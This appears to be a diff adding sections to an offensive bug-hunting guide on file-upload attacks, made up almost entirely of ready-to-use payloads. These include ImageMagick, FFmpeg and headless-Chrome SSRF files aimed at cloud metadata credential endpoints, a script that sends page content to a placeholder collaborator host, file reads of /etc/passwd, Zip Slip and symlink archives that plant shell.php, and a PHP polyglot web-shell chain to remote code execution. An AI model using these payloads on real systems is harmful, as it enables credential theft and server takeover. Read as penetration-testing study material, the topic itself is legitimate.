@@ -46,6 +46,106 @@ filename=shell.phtml, shell.pHp, shell.php5   → extension variants
 
 ---
 
+## ImageMagick / FFmpeg Exploitation
+
+### ImageMagick SSRF / File Read (ImageTragick family + modern variants)
+```bash
+# Upload this as a .mvg or rename to .jpg/.png (magic bytes bypass)
+# MVG SSRF payload — fetches internal URL during processing
+cat > /tmp/ssrf.mvg << 'EOF'
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(http://169.254.169.254/latest/meta-data/iam/security-credentials/)'
+pop graphic-context
+EOF
+
+# SVG SSRF (ImageMagick processes SVG remotely)
+cat > /tmp/ssrf.svg << 'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://COLLAB_HOST/imagemagick-ssrf" width="200" height="200"/>
+</svg>
+EOF
+
+# WebP/AVIF processing bugs (modern surface — CVE-2023-4863)
+# Upload a crafted WebP file targeting libwebp heap overflow
+# Use: https://github.com/mistymntncop/CVE-2023-4863 PoC
+```
+
+### FFmpeg SSRF via HLS Playlist
+```bash
+# FFmpeg processes m3u8 playlists and fetches referenced segments
+cat > /tmp/ssrf.m3u8 << 'EOF'
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+#EXT-X-ENDLIST
+EOF
+
+# Also works with concat demuxer
+cat > /tmp/concat.txt << 'EOF'
+ffconcat version 1.0
+file 'http://COLLAB_HOST/ffmpeg-ssrf'
+EOF
+
+# Test: upload .m3u8 or video file to any video processing endpoint
+```
+
+---
+
+## Headless Chrome / PDF Generator SSRF
+
+### HTML → PDF Converter Attacks
+```bash
+# Target: invoice generators, report exporters, screenshot services
+# Inject HTML that causes headless Chrome to fetch internal resources
+
+# SSRF via CSS import
+PAYLOAD='<html><head><style>@import url("http://169.254.169.254/latest/meta-data/");</style></head><body>test</body></html>'
+
+# SSRF via HTML iframe
+PAYLOAD='<html><body><iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1000" height="1000"></iframe></body></html>'
+
+# Local file read
+PAYLOAD='<html><body><iframe src="file:///etc/passwd" width="1000" height="1000"></iframe></body></html>'
+
+# JavaScript execution (if sandbox not enforced)
+PAYLOAD='<html><body><script>
+fetch("http://COLLAB_HOST/chrome-rce?d=" + encodeURIComponent(document.documentElement.innerHTML));
+</script></body></html>'
+
+# Test: submit HTML to any /generate-pdf, /export, /screenshot, /report endpoint
+curl -s -X POST "https://$TARGET/api/generate-pdf" \
+  -H "Content-Type: application/json" \
+  -d "{\"html\": \"$PAYLOAD\"}"
+```
+
+---
+
+## Archive Extraction Attacks (Zip Slip / Symlink)
+
+```bash
+# Zip Slip — path traversal via archive filenames
+pip3 install evilarc
+python3 evilarc.py shell.php -o unix -p "../../../var/www/html/" -d 5 -f /tmp/zipslip.zip
+
+# Symlink attack — archive contains symlink to sensitive file
+mkdir -p /tmp/sym_attack
+ln -s /etc/passwd /tmp/sym_attack/innocent.txt
+zip -ry /tmp/symlink.zip /tmp/sym_attack/
+
+# TAR symlink attack
+tar --create --file=/tmp/symlink.tar --dereference /tmp/sym_attack/
+
+# Test: upload to any /import, /extract, /unzip endpoint
+curl -s -X POST "https://$TARGET/api/import" \
+  -F "file=@/tmp/zipslip.zip"
+```
+
+---
+
 ## Related Skills & Chains
 
 - **`hunt-rce`** — File upload is the most common path to RCE on classic PHP/JSP/ASPX stacks once you find a directly-served upload directory or a deserializer-fed processor. Chain primitive: polyglot `GIF89a;<?php system($_GET['c']);?>` bypasses magic-byte check + `.phtml` extension bypasses allowlist → `GET /uploads/shell.phtml?c=id` → RCE; or PHP `phar://` upload to a sink calling `file_exists()` on the attacker-controlled path → PHP object deserialization → RCE.
